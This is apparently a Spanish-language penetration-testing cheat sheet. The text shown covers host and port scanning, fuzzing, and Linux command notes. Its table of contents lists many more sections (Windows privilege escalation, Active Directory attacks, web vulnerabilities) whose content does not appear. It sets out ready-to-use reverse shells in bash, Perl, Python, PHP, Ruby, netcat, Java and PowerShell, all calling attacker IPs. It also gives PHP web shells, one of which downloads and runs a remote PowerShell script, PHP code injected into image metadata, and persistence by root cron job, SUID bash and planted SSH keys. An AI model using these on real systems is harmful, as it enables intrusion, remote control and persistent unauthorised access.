# Fase de Recopilación Activa
- [Enumeración](#Enumeración)
- [Web Shells y Reverse Shells](#Web-Shells-y-Reverse-Shells)
- [Linux](#Linux)
   - [Comandos Útiles Linux](#Comandos-Útiles-Linux)
   - [Herramientas para enumerar un sistema Linux](#Herramientas-para-enumerar-un-sistema-Linux)
   - [Escalada de Privilegios Linux](#Escalada-de-Privilegios-Linux)
      - [Pkexec Pwnkit](#Pkexec-Pwnkit)
      - [lxd](#lxd)
      - [Dirty Cow](#Dirty-Cow)
      - [Pre Invoke](#Pre-Invoke)
      - [SETENV](#SETENV)
   - [Persistencia Linux](#Persistencia-Linux)
- [Windows](#Windows)
   - [Comandos Útiles Windows](#Comandos-Útiles-Windows)
   - [Herramientas para enumerar un sistema Windows](#Herramientas-para-enumerar-un-sistema-Windows)
   - [Escalada de Privilegios Windows](#Escalada-de-Privilegios-Windows)
      - [JuicyPotato](#JuicyPotato)
      - [Churrasco](#Churrasco)
      - [PrintSpoofer](#PrintSpoofer)
      - [Server Operators](#Server-Operators)
      - [UsoSvc CVE 2019 1322](#UsoSvc-CVE-2019-1322)
      - [Spoolsv](#Spoolsv)
      - [MS10-059 Windows 7 Enterprise](#MS10-059-Windows-7-Enterprise)
      - [MS11-046 kernel Windows 7 Server 2003](#MS11-046-kernel-Windows-7-Server-2003)
      - [MS15-051 kernel Microsoft Windows Server 2008 Windows 7 Windows Server 2003](#MS15-051-kernel-Microsoft-Windows-Server-2008-Windows-7-Windows-Server-2003)
      - [MS16-098 kernel Windows Server 2012](#MS16-098-kernel-Windows-Server-2012)
      - [AutoLogon Credentials](#AutoLogon-Credentials)
      - [AlwaysInstallElevated](#AlwaysInstallElevated)
   - [Dumpear contraseñas](#Dumpear-contraseñas)
   - [Persistencia Windows](#Persistencia-Windows)
   - [Active directory](#Active-directory)
      - [Kerberos 88 tcp](#Kerberos-88-tcp)
         - [Kerberoasting Attack](#Kerberoasting-Attack) 
         - [ASREPRoast Attack](#ASREPRoast-Attack)
      - [Rpcclient 135 593 tcp](#Rpcclient-135-593-tcp)
      - [ldap 389 636 3268 3269 tcp](#ldap-389-636-3268-3269-tcp)
      - [BloodHound](#BloodHound)
      - [BloodHound python](#BloodHound-python)
      - [ldapdomaindump](#ldapdomaindump)
      - [Laps](#Laps)
      - [DCSync Attack](#DCSync-Attack)
      - [gpp decrypt](#gpp-decrypt)
      - [Grupos](#Grupos)
- [Msfvenom Payloads](#Msfvenom-Payloads) 
- [Herramientas](#Herramientas)
   - [Password Guessing and Cracking Passwords](#Password-Guessing-and-Cracking-Passwords)
   - [BurpSuite](#BurpSuite)
   - [Metasploit](#Metasploit)
   - [xsser](#xsser)
- [Pivoting](#Pivoting)
   - [Chisel](#Chisel)
   - [Proxychains](#Proxychains)
   - [SSH](#SSH)
   - [Socat](#Socat)
   - [Netsh](#Netsh)
   - [Enrutamiento](#Enrutamiento)
- [Servicios](#Servicios)
   - [FTP 21 tcp](#FTP-21-tcp)
   - [SSH 22 tcp](#SSH-22-tcp)
   - [Whois 43 tcp](#Whois-43-tcp)
   - [DNS 53 tcp](#DNS-53-tcp)
   - [POP 110 995 tcp](#POP-110-995-tcp)
   - [SMB 139 445 tcp](#SMB-139-445-tcp)
   - [mssql 1443 tcp](#mssql-1443-tcp)
   - [NFS Services 2049 tcp](#NFS-Services-2049-tcp)
   - [Squid proxy 3128 tcp](#Squid-proxy-3128-tcp)
   - [MySQL 3306 tcp](#MySQL-3306-tcp)
   - [RDP 3389 tcp](#RDP-3389-tcp)
   - [SaltStack 4505 4506 tcp](#SaltStack-4505-4506-tcp)
   - [vnc 5800 5801 5900 5901 tcp](#vnc-5800-5801-5900-5901-tcp)
   - [Winrm 5985 tcp](#Winrm-5985-tcp)
   - [Winrm 5986 tcp](#Winrm-5986-tcp)
   - [Redis 6379 tcp](#Redis-6379-tcp)
   - [H2 Database Console 8082 tcp](#H2-Database-Console-8082-tcp)
   - [Memcached 11211 tcp](#Memcached-11211-tcp)
   - [GlusterFS 24007 49251 49152 tcp](#GlusterFS-24007-49251-49152-tcp)
   - [Mongodb 27017 tcp](#Mongodb-27017-tcp)
   - [Jenkins 8080 50000 tcp](#Jenkins-8080-50000-tcp)
   - [TFTP 21 udp](#FTP-21-udp)
   - [SNMP 161 udp](#SNMP-161-udp)
   - [Wordpress](#Wordpress)
   - [Joomla](#Joomla)
   - [Drupal](#Drupal)
   - [Bolt](#Bolt)
   - [Apache](#Apache)
   - [Tomcat](#Tomcat)
   - [Nginx](#Nginx)
   - [Flask](#Flask)
   - [Dompdf](#Dompdf)
   - [vnc](#vnc)
   - [webdav](#webdav)
   - [Kubernetes](#Kubernetes)
   - [Docker](#Docker)
   - [Node js JWT](#Node-js-JWT)
   - [Nodered](#Nodered)
   - [GIT](#GIT)
   - [Firefox credentials](#Firefox-credentials)
   - [Microsoft iis 7](#Microsoft-iis-7)
   - [XDEBUG](#XDEBUG)
   - [Jamovi](#Jamovi)
   - [RocketChat](#RocketChat)
   - [TeamViewer](#TeamViewer)
   - [ServiceDesk plus](#ServiceDesk-plus)
- [Vulnerabilidades Web](#Vulnerabilidades-Web)
   - [SSTI Server Side Template Injection](#SSTI-Server-Side-Template-Injection)
   - [LFI y Directory Path Traversal](#LFI-y-Directory-Path-Traversal)
   - [Log Poisoning LFI a RCE](#Log-Poisoning-LFI-a-RCE)
   - [SFC File](#SFC-File)
   - [Shellshock](#Shellshock)
   - [XXE XML external entity injection](#XXE-XML-external-entity-injection)
   - [SQL Injection](#SQL-Injection)
     - [SQLMAP](#SQLMAP)
   - [Nosql Injection](#Nosql-Injection)
   - [PostgreSQL Injection](#PostgreSQL-Injection)
   - [Time based OTPs](#Time-based-OTPs)
- [Ebowla](#Ebowla)
- [Informe Auditoría](#Informe-Auditoría)
- [Otras cosas](#Otras-cosas)
   - [Port knocking](#Port-knocking)
   - [Descarga de contenido](#Descarga-de-contenido)
   - [Otros Comandos](#Otros-Comandos)
   - [Links](#Links)
   - [Extensiones](#Extensiones)
## Enumeración
- Detectar equipos activos y escanear un rango de ip:
```bash
ping -c 1 192.168.1.60 # Hacer ping desde equipos Linux IPv4
ping -n 1 192.168.1.60 # Hacer ping desde equipos Windows IPv4
ping6 -c 1 dead:beef:0000:0000:0250:56ff:feb9:0b68 # IPv6

fping -a -g 192.168.1.0 192.168.1.255 2>/dev/null
fping -a -g 192.168.1.0/24 2>/dev/null
sudo nmap -sn 192.168.248.0/24 2>/dev/null

> Binario estático nmap
nmap -sn 10.10.10.0/24 # Enumeración para encontrar equipos activos en la red
nmap 10.10.10.5 10.10.10.20 # Enumeración de los equipos encontrados para ver puertos y los servicios
```
- Escanear puertos TCP/UDP:
```bash
sudo nmap -sS --open -p- -T3 -v -n -Pn 192.168.1.60 -oG Ports
sudo nmap -sU --open -p- -T3 -v 192.168.1.60 -oG UDPPorts
sudo masscan -p1-65535,U:1-65535 192.168.1.60 --rate=1000 -p1-65535,U:1-65535 -e tun0  # tcp y udp
sudo zenmap-kbx # Con interfaz gráfica

sudo nmap -sS --open -p- -T3 -n -v -Pn -6 dead:beef::250:56ff:feb9:b4a -oG ipv6Puertos # Enumeración por ipv6
```
- Escanear servicios:
```bash
masscan --rate=500 --banners -p22,80,443 -Pn 192.168.1.60
nmap -sCV -p22,80 -v -Pn 192.168.1.60 -oN infoServices
nmap -sV --script=vuln -v -Pn 192.168.1.60
nmap --script "vuln and safe" -p445 192.168.1.60 -oN smbscan

nmap -sCV -p22,80 -v -6 dead:beef::250:56ff:feb9:b4a -oN ipv6InfoServicios # Enumeración de los servicios por ipv6
```
- Fuzzing:
```bash
> Nmap
nmap --script http-enum -p80 192.168.1.60
nmap --script http-enum --script-args http-enum.basepath='eldirectorio/' -p80 192.168.1.60

> Wfuzz
wfuzz -c -L -t 100 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.1.60/FUZZ/
wfuzz -H "Host: FUZZ.example.local" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 30587  https://example.local/
wfuzz -c -L -t 100 --hc=404 -z range,1-65535 --hh=2 http://192.168.1.60:8080/url.php?path=http%3A%2F%2Flocalhost%3AFUZZ

> Gobuster
gobuster -t 100 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.60/
gobuster -t 100 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,asp,aspx,html -u http://192.168.1.60/
gobuster -t 100 vhost -u http://example.local/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

> ffuf
ffuf -c -r -t 100 --mc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs=169 -u http://192.168.1.60/FUZZ/
ffuf -c -r -t=100 --mc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e=txt,php,html -fs=169 -u http://192.168.1.60/FUZZ/
ffuf -c -r -t=100 --mc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w file -fs=169 -u http://192.168.1.60/FUZZ.FUZ2Z
ffuf -H "Host: FUZZ.example.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 5480 -u http://example.local

> Otros fuzzers
dirbuster > /dev/null 2>&1 &
dirb http://192.168.1.60/project -u admin:admin
dirsearch -u http://192.168.1.60/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
sudo feroxbuster -u http://192.168.1.60:<PUERTO>/ --wordlist /usr/share/wordlists/rockyou.txt 
```
- Fuzzing usuarios y passwords (GET):
```bash
> Con Wfuzz:
wfuzz -c -H "Cookie: JSESSIONID=CF08F50081D7236D4122AC1EBF4C0371;" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt "http://192.168.1.60:8080/servlet/AJaxServlet?action=checkUser&search=FUZZ"

> Con un bucle for:
for user in $(cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt); do echo -e "\n\n [+] For user: $user\n"; curl -s -X GET "http://192.168.1.60:8080/servlet/AJaxServlet?action=checkUser&search=$user" -H "Cookie: JSESSIONID=CF08F50081D7236D4122AC1EBF4C0371;"; done

> Con un bucle while:
cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt | while read user; do echo -e "\n\n [+] For user: $user\n"; curl -s -X GET "http://192.168.1.60:8080/servlet/AJaxServlet?action=checkUser&search=$user" -H "Cookie: JSESSIONID=CF08F50081D7236D4122AC1EBF4C0371;"; done
```
- Fuzzing usuarios y passwords (POST):
```bash
> Con Wfuzz:
wfuzz -c -L -t 100 --hc=404 -w /usr/share/seclists/Usernames/Names/names.txt --ss "Invalid login" -d "username=FUZZ&password=pass" http://192.168.1.60:5000/login
wfuzz -c -L -t 100 --hc=404 -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -d "username=admin&password=FUZZ&submit=Login" --hh=542 http://10.10.10.86/login
```
### Host Discovery y Port Discovery en Linux
```bash
for i in {1..254}; do (ping -c 1 192.168.18.${i} | grep "bytes from" &); done
for i in $(seq 1 254); do (ping -c 1 10.100.10.$i | grep "bytes from" &); done

for i in {1..65535}; do (echo > /dev/tcp/192.168.18.1/$i) >/dev/null 2>&1 && echo $i is open; done
for port in $(seq 1 65535); do (nc -nvz 10.100.10.4 $port); done
```
### Host Discovery en Windows cmd:
```bash
Fuente: https://stackoverflow.com/questions/13713318/ping-all-addresses-in-network-windows
arp -a # Vemos la composición de la tabla arp
for /L %a in (1,1,254) do @start /b ping 172.25.10.%a -w 100 -n 2 >nul # Lanzamos el escaneo de hosts
arp -a # Ahora al revisar de nuevo la tabla arp podremos ver los nuevos hosts encontrados
```
### Searchsploit
```bash
searchsploit -p 654651 # Obtener información
searchsploit -m 654651 # Descarga
searchsploit-x 654651 # Examina
```
### Otros
```bash
whatweb http://192.168.1.60/ -v 2>/dev/null # Obtener información sobre un servicio http o https
```
- Capturar tráfico:
```bash
sudo tcpdump -i tun0 -w captura.cap -v # Captura tráfico y lo guarda en captura.cap
sudo tcpdump -i tun0 icmp -v # Captura trazas icmp
tshark -r captura.cap -Y "http" -Tfields -e tcp.payload 2>/dev/null |xxd -ps -r | grep "get" # Analiza una captura
wireshark # Analiza una captura. Para encontrar algo en wireshark: http contains <LAPALABRAQUEBUSCO>
```
- Escanear equipo:
```bash
enum4linux 192.168.1.60
owasp-zap
Nessus # Para iniciarlo: /bin/systemctl start nessusd.service # Para acceder: https://kali:8834/
./cmsmap.py https://192.168.1.60/ -f W -F # Escanea el cms en busca de vulnerabilidades
```
## Web Shells y Reverse Shells
- Fuente: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- Fuente: https://www.revshells.com/
- Bash
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
```
- Perl
```bash
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
- Python
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
- PHP
```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
- Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
- Netcat
```bash
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
- Java
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
- Powershell
```bash
powershell.exe .\nc.exe 10.50.73.2 443 -e cmd.exe # Reverse shell
```
### PHP Shells
- WebShell: https://github.com/WhiteWinterWolf/wwwolf-php-webshell
- Webshell: /usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php
```bash
<?php
	echo shell_exec($_REQUEST['cmd']);
?>
```
```bash
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
```bash
<?php
	system("bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'");
?>
```
```bash
<?php 
	system("nc.exe -e cmd 10.10.14.6 443");
?>
```
```bash
<?php
	system("cmd /c powershell IEX(New-Object Net.WebClient).downloadString(\'http://10.10.14.6/Invoke-PowerShellTcp.ps1\')");
?>
```
### Python Shells
```bash
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.13",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```
```bash
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```bash
import os
os.system("chmod u+s /bin/bash")
```
### Fake shell
- Ejemplo de Fakeshell over http en bash:
```bash
#!/bin/bash

while [ "$command" != "exit" ]; do
        echo -n "> " && read -r command
        command="$(echo "$command 2>%261" | tr ' ' '+')"
        curl -s -X GET "http://<URL>/?cmd=$command" | grep "<pre>" -A 1000 | grep "</pre>" -B 1000| sed 's/<pre>//' | sed 's/<\/pre>//'
done
```
- ttyoverhttp
```bash
https://github.com/s4vitar/ttyoverhttp # Me descargo el script y lo modifico incluyendo la url del archivo desde el que puedo ejecutar comandos
```
## Linux
### Comandos Útiles Linux
```bash
ifconfig # Ver ip e interfaces
ip a # Ver ip e interfaces
sudo -l # Listar priviliegios de superusuario
ip neighbour # Tabla arp
lsb_release -a # Información del sistema
netstat -ant # Ver los puertos abierto
netstat -an -p tcp # Ver los puertos abierto
lsof -i:80 # Ver el servicio que esta corriendo por ese puerto
uname -a # Información del sistema
--text # Si al realizar una busqueda me aparece "binary file matches" añado esto para que me muestre el contenido
cat in* # Ver el contenido de un archivo que empieza por "in" pero no se como termina
touch -- '-e sh test.txt' # Crea un archivo que empieza con guión
openssl passwd # Para generar una nueva contraseña
--data-urlencode # Para tramitar data url encode por curl, ejemplo curl -s -X GET -G "http://127.0.0.1/" --data-urlencode "data enviada"
echo -e '#!/bin/bash\nchmod u+s /bin/bash' > openssl
kill -BUS 1621 # Matar el BUS de un proceso
df -h # Ver las particiones o los usb que estan montados en un sistema Linux
strings elarchivo # Lista los caracteres imprimibles de un archivo
ls -l /bin/bash # Ver permisos de un archivo, ejemplo con bash
sudo -u <USUARIO> bash # Para convertirme en otro usuario
ps -eo command # Ver los comandos que se van ejecutando en el sistema, procmon (process Monitor)
chown root:root <ARCHIVO> # Asigna un archivo a root como propietario y grupo
systemctl list-timers # Ver las próximas tareas que se van a ejecutar
mount # Ver monturas
wget -r http://192.168.1.60/carpeta # Descarga recursiva de un contenido
wget 192.168.1.60/rev.sh -O /tmp/rev.sh # Descarga un contenido y lo deposita en una ruta concreta
curl -s -X GET "http://192.168.1.60/dev/hype_key" | xxd -ps -r # Convertir un hexadecimal a texto con curl
cat archivo | xxd -ps -r # Pasar un texto de hexadecimal a texto plano y con -ps quitar el contenidos de los lados
cat /etc/passwd | xxd # Pasar un texto a hexadecimal
cat archivo | xxd -r # Pasar un texto de hexadecimal a texto plano
curl -s -X GET http://192.168.1.60/ -I # Para ver las cabeceras con curl
curl http://192.168.1.60/chisel -o chisel # Transferir archivo a la máquina objetivo
apt search glusterfs # Busca paquetes que contengan ese nombre
dpkg -i nombrepaquete # Instalar .deb
sudo apt-get --purge remove [nombre del programa] # Desinstalar programa
sponge users.txt # Permite modificar el contenido del archivo. Instalar: sudo apt install moreutils
sudo -u root /usr/bin/python /home/richard/test.py # Para ejecutar como root. Ejemplo: (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py

> Rutas:
/etc/passwd
/etc/group
/proc/net/fib_trie # Ver ip e interfaces
/etc/crontab # Ver tareas cron activas
/proc/net/tcp # Ver los puertos abiertos (hexadecimal)

> Find
find \-type f 2>/dev/null | grep "config" # Encontrar archivos que tengan en el nombre una palabra
find / -type d -name dstat 2>/dev/null # Encontrar un directorio con el nombre dstat
find \-name \*snmp\* # O esto también
find \-name user.txt 2>/dev/null # Encontrar archivos con un nombre concreto
find \-name *.php # Encontrar archivos con extensión php
find / -writable 2>/dev/null | grep -vE "/var|/run|/proc|/lib|/sys|/dev" # Encontrar archivos con permisos de escritura
find / -group logs 2>/dev/null | grep -vE "proc|home" # Encontrar archivos que pertenecen al grupo logs
find / -user <USUARIO> 2>/dev/null | grep -v -E "proc|var" # Encontar archivos de un usuario

> Crear servidor
python2 -m SimpleHTTPServer 80
python3 -m http.server 80
php -S 0.0.0.0:80
```
#### Firewall Linux
```bash
Fuente: https://www.linuxcloudvps.com/blog/10-useful-firewall-cmd-commands-in-linux/

> Estado
sudo systemctl start firewalld && systemctl enable firewalld # Iniciarlo y activarlo
sudo systemctl status firewalld # Ver el estado de firewall
sudo firewall-cmd --list-all-zones # Listar la información de las zonas
sudo firewall-cmd --list-ports # Ver los puertos que están abiertos en el firewall

sudo firewall-cmd --runtime-to-permanent # Hacer los cambios permanentes

> Abrir puertos
sudo firewall-cmd --zone=public --add-port 2000/tcp # Permitir conexiones a través de firewall
sudo firewall-cmd --add-port=80/tcp # Permitir conexiones a través de firewall

> Cerrar puertos
sudo firewall-cmd --remove-port=3306/tcp # No permitir conexiones a través de firewall

> Port forwarding
sudo firewall-cmd --zone=public --add-forward-port=port=80:proto=tcp:toport=443
```
#### iptables
```bash
sudo /sbin/iptables -A OUTPUT -p tcp -d 10.10.14.8 -j ACCEPT
sudo /sbin/iptables -A INPUT -p tcp -s 10.10.14.8 -j ACCEPT
```
#### Concatenar comandos en Linux
```bash
Comando1 ; Comando2 # El Comando2 se ejecutará sin importar el resultado del primero
Comando1 & Comando2 # Los dos comandos se ejecutarán de forma simultanea
Comando1 && Comando2 # El Comando2 se ejecutará solo si el Comando1 termina con éxito
Comando1 | Comando2 # Este pipe hace que la salida del Comando1 se convierta en la entrada del Comando2
Comando1 || Comando2 # El Comando2 se ejecutará solo si el primero termina sin éxito.
```
#### Grep, awk, tr, sed, xargs
```bash
> grep
grep -oP '\[.*?\]' # Para quedarme con las lineas que tienen corchetes
grep -r -i "pass" 2>/dev/null # Para buscar recursivamente -r una palabra dentro de los archivos de un directorio, case insensitive -i
grep -R "marcus" /etc/ 2>/dev/null # Busca de forma recursiva una palabra dentro del directorio etc, igual que -r pero sigue también todos los enlaces simbólicos
grep -v "0x" # Elimina las lineas que tienen algo
grep -v "^#" # Elimina las lineas que empiezan por algo
grep -n "1234" /usr/share/wordlists/rockyou.txt # Indica el número de la linea en la que se encuentra la coincidencia
grep PBKDF2 -C 2 # Para ver 2 lineas antes y después de la coincidencia
grep "<pre>" -A 50 | grep "</pre>" -B 50 # Para que me muestre las 50 lineas hacia abajo desde la etiqueta <pre> y las 50 lineas hacia arriba desde la etiqueta </pre>
grep -i user 'PRTG Configuration.old.bak' -C 4 | less # less es para empezar a ver el archivo por el principio

> awk
awk 'NF{print $NF}' # Quedarme con el último argumento
awk 'NF{print $2}' # Quedarme con el segundo argumento
awk '{print $1}' FS='/' # Con el delimitador / quedarme con el primer argumento
awk '{print $5 " " $1}' # Para quedarme con el quinto argumento y el primero, en este orden y poner un espacio de separador
cat file.php | awk 'NR==100' > newFile # Copia el contenido que aparece en la linea 100 y lo mete en un nuevo archivo

> tr
tr -d '[]' # Quitar caracteres
tr -d '\n' # Quitar un salto de linea o tr -d "\n\r"
tr ' ' ',' # Sustituir los espacios por comas
tr [:upper:] [:lower:] # Pasar las mayúsculas a minúsculas

> sed
sed 's/\\n/\n/g' # Interptreta los saltos de linea \n
sed 's/\\r/\r/g' # Interptreta los retornos de carro \r
sed '/^\s*$/d' # Elimina todas las lineas vacias dentro de un texto
sed 's/dato/nuevoDato/g' # Sustituye de forma recursiva la palabra "dato" por "nuevoDato"
sed 's/,/\r\n/g' # Cambiar la coma por \r\n (el contenido pasa a una nueva linea)
sed 's/^ //' # Quitar el espacio del principio de una frase

> xargs
xargs # Compacta un texto en una misma linea

> Otros
cut -d "/" -f 1 # Con el delimitador / quedarme con el primer argumento
cp -R /mnt/test/* . # Para copiar todo el contenido de una carpeta de forma recursiva
tail -n 1 # Quedarme con el último argumento				   
sort -u # Quitar repeticiones
html2text # Quitar los caracteres y simbolos de html y pasarlo a texto
; echo # Quitar un # al final de un texto
wc -l # Saber cuantas lineas tiene un archivo
wc -c # Saber cuantos caracteres tiene un texto
ls -la # Ver archivos ocultos en un directorio
base64 -w 0 portDiscovery.sh | xclip -sel clip # Codificar algo en base64 y ponerlo en el portapapeles
echo "aquielcodigoenbase64" | base64 -d > portDiscovery.sh # Decodificar algo en base64
bash -p # Para aprovechar el permiso suid y que nos de una shell atendiendo al propietario del archivo para ser root
file elarchivo # Ver el tipo de archivo
ps -auwx # Ver los servicios que estan corriendo en la máquina
kill <UIDPROCESO> # Matar un proceso
tree # Ver la estructura de una carpeta y los nombres de los acrchivos.
tree -L 3 # En este caso solo veremos 3 niveles de profundidad
display nombreimagen # Ver el contenido de una imagen
```
#### El Path
```bash
echo $PATH # Ver el PATH
export PATH=/tmp:$PATH # Modificar el PATH y añadir un nuevo directorio al principio, en este caso tmp
export PATH=$PATH:/tmp # Modificar el PATH y añadir un nuevo directorio al final, en este caso tmp

> Python
python -c 'import sys; print sys.path' # Ver el PATH de python
python -c 'import sys; print(sys.path)' # Ver el PATH de python
# Library hijacking: python coge como primera opción la ruta de trabajo actual para cargar librerías
```
#### TTY Linux
- Hacer tratamiento de la TTY:
```bash
script /dev/null -c bash
control+z
stty raw -echo ; fg
reset xterm

> Exportar variables:
export TERM=xterm
export SHELL=bash

> Setear filas y columnas:
stty -a
stty rows 60 columns 236

> Si no consigo una shell interactiva de la forma habitual, utilizo which para ver que hay instalado en el equipo: /bin/bash, /bin/sh, python,...etc.
Fuente: https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html
Fuente: https://rcenetsec.com/shell-spawning/

python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

> Para escapar de python y obtener una consola en bash:
>>> import os
>>> os.system('/bin/bash');
```
#### Binarios
```bash
ltrace ./<BINARIO> # Inspeccionar binario
strace ./<BINARIO> # Inspeccionar binario
ldd ./<BINARIO> # Ver las librerías que utiliza un binario
du -hc archivo # Saber cuanto pesa un archivo
upx archivo # Reducir el peso de un binario
```
#### Tmux
```bash
tmux new -s NOMBRESESIÓN # Crear una sesión
Ctrl+B c # Crear una nueva ventana
Ctrl+B n # Cambiar a la ventana siguiente 
Ctrl+B , # Cambiar el nombre de una ventana
Ctrl+B % # Dividir paneles verticalmente
Ctrl+B " # Dividir paneles horizontalmente
exit # Salir
```
#### Tmux socket file
```bash
ls -l /.devs/dev_sess
srw-rw---- 1 root hype 0 Oct  6 07:40 /.devs/dev_sess # Sesión compartida entre hype y root
tmux -S /.devs/dev_sess # Socket file. Para acceder a la sesión compartida
```
#### Comprimir y descomprimir
```bash
> Ficheros zip
zip -r user_config.zip user_config # Crea un comprimido llamado user_config.zip del directorio user_config. Si quiero protegerlo con contraseña le añado -e

> Ficheros tar
tar -cvf archivo.tar /dir/a/comprimir/ # Empaquetar
tar -xvf archivo.tar # Desempaquetar
tar -tf archivo.tar # Ver contenido

> Ficheros gz
gzip -9 fichero # Comprimir     
gzip -d fichero.gz # Descomprimir
unzip fichero.gz # Descomprimir

> Ficheros tar.gz
tar -czfv archivo.tar.gz ficheros # Comprimir
tar -xzvf archivo.tar.gz # Descomprimir
tar -tzf archivo.tar.gz # Ver contenido

# Archivo .gz Si al intentar descomprimir un archivo, este está corrupto o con errores, puedo intentar arreglarlo
git clone https://github.com/yonjar/fixgz # Descargo el repositorio
gcc fixgz.cpp -o fixgz # Compilo el binario
./fixgz db.sql.gz fix_db.sql.gz # Le paso el archivo corrupto y el nuevo como lo quiero una vez arreglado

> Ficheros .jar
7z l elarchivo # Ver lo que hay dentro
7z l -slt elarchivo # Ver lo que hay dentro
7z x elarchivo # Descomprimir
jd-gui # Para explorar los archivos .jar y lo que hay dentro como puede ser algún .class

> Ficheros .war
unzip archivo.war # Descomprimir un .war
```
#### Montar un dispositivo
```bash
mkdir /mnt/test # Creo una carpeta dentro de /mnt
mount /dev/sda2 /mnt/test # Después monto el disco que quiero dentro de la carpeta creada
```
#### Crear tarea cron
```bash
echo '* * * * * root sh /tmp/reverse.sh' > reverse # Primero creo el archivo con la tarea y lo meto en /etc/cron.d
/tmp/reverse.sh # Ahora creo el archivo que contiene el comando que quiero que se ejecute
```
#### Cat EOF
- Sirve para incorporar varias líneas de contenido a un archivo.
```bash
cat <<_EOF_>NOMBREARCHIVO # Primero indicamos esto
# Y después todo el contenido del archivo terminando con _EOF_:

Este sería un contenido de ejemplo.
Esta es otra linea de ejemplo.
_EOF_
```
#### Exiftool
```bash
exiftool archivo.pdf # Extrae información y metadatos del archivo
exiftool *.pdf | grep "Creator" # Extrae el metadato de un campo concreto de todos los archivos pdf
```
- Insertar código en un archivo:
```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' imagen.jpg # Posteriormente, es necesario renombar el archivo imagen.jpg a imagen.php.jpg.
```
#### pdftotext
- Es una herramienta que convierte el contenido de un pdf a texto creando un nuevo archivo .txt:
```bash
pdftotext file.pdf

> Para convertir a texto todos los archivos pdf de un directorio:

for file in $(ls); do pdftotext $file; done
```
#### olevba
- Ver las macros que contiene un archivo:
```bash
https://github.com/decalage2/oletools/wiki/Install
sudo -H pip install -U oletools[full]

olevba 'Currency Volume Report.xlsm'
```
#### php malware scanner
```bash
git clone https://github.com/scr34m/php-malware-scanner

./scan -d ../backup -L -k # Escanea el directorio seleccionado. -L indica la linea dentro del archivo con contenido malicioso -k quita los ok
```
#### authbind
- Si existe en la máquina, puede que tenga reglas configuradas que me permitan realizar tareas sin tener los privilegios de root:
```bash
/usr/bin/authbind 
/etc/authbind/byport # Reglas asignadas
authbind python -m SimpleHTTPServer 80 # Ejemplo de uso al tener una regla configurada para el puerto 80
```
#### pwncat-cs
- Herramienta similar a evil-winrm, para crearme una consola interactiva dentro de la herramienta:
```bash
pip3 install pwncat-cs # Instalar

/home/kali/.local/bin/pwncat-cs -lp 443 # Me pongo en escucha con la herramienta por el puerto 443 y me envío una reverse shell por ese puerto a través de la vulnerabilidad encontrada.

# Ahora tendría una shell interactiva a través de pwncat-cs con la que poniendo help puedo ver todas las opciones que tengo:
upload pspy64 /tmp/pspy64 # Subir archivos y depositarlo en una ruta concreta
back # Me da una shell
```
#### authorized_keys
- Si quiero acceder por ssh a la máquina objetivo sin contraseña:
```bash
ssh-keygen # Generar las claves id_rsa e id_rsa.pub
cat id_rsa.pub | tr -d '\n'| xclip -sel clip # Copiarla al portapapeles

mkdir .ssh # Crear la carpeta .ssh
nano authorized_keys # Crear el archivo authorized_keys para que contenga mi id_rsa.pub
chmod 600 authorized_keys # Ponerle el permiso 600

nano /etc/ssh/sshd_config # Editar el archivo con la siguiente configuración:
PermitRootLogin yes
PasswordAuthentication yes
ChallengeResponseAuthentication no

